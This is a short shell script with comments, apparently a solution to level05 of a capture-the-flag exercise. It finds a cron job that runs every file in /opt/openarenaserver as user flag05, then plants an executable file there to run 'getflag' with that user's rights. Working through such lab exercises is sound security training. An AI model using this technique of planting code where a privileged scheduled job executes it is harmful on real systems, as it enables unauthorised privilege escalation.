#!/bin/sh
find / -name 'level05' -not -path "./proc/*" 2>/dev/null

# This returns a path to a mail that contains :
# 	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
# This translates to "execute as flag05 the openarenaserver program every 2 minutes"

# If we check the contents of /usr/sbin/openarenaserver, we get this :
##!/bin/sh
#
#for i in /opt/openarenaserver/* ; do
#	(ulimit -t 5; bash -x "$i")
#		rm -f "$i"
#done
# This script passes each file contained in /opt/openarenaserver to bash,
# if the file is executable.
# This means we can put our malicious code in a file in /opt/openarenaserver and
# wait for openarenaserver to execute it.

echo -n "getflag>/var/crash/out" > /opt/openarenaserver/file
chmod +x /opt/openarenaserver/file
